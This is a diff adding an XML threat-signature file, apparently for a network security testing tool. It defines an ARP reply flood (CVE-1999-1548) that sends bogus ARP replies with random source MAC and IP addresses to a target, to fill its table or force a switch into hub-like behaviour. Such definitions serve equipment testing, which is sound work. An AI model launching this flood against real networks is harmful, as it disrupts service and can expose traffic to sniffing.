@@ -1,0 +1,65 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ARP Reply Flood"/>
+    <EngDesc display="true" value="This threat sends bogus ARP replies to the target machine, in an effort to cause its lookup table to fill or cause other aberrant behaviour. After the ARP table is full, sometimes the switch will failover to a hub-like system."/>
+    <Intent display="true">
+      <item value="Flood"/>
+    </Intent>
+    <Protocol display="true" value="ARP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="ALL"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Network_Layer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Network_Layer_ARP"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/bid/821/discussion/"/>
+    <CVEID display="true" value="CVE-1999-1548"/>
+    <bugtraqID display="true" value="821"/>
+    <OSVDB display="true" value="10060"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464da76700a900fe009b00c97b9f9db5"/>
+    <Revision display="true" value="10"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725919122187500"/>
+    <SigStyle display="false" value="Flood"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="ARP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1139461733" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="@random(00:00:00:00:00:00, FF:FF:FF:FF:FF:FF)" destMac="$destMAC" pktType="0806">
+      <ARP hwAddrType="0001" protoAddrType="0800" hwAddrSize="6" protoAddrSize="4" op="2" srcMac="@random(00:00:00:00:00:00, FF:FF:FF:FF:FF:FF)" srcIP="@random(0.0.0.0, 255.255.255.255)" destMac="$destMAC" destIP="$destIP"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
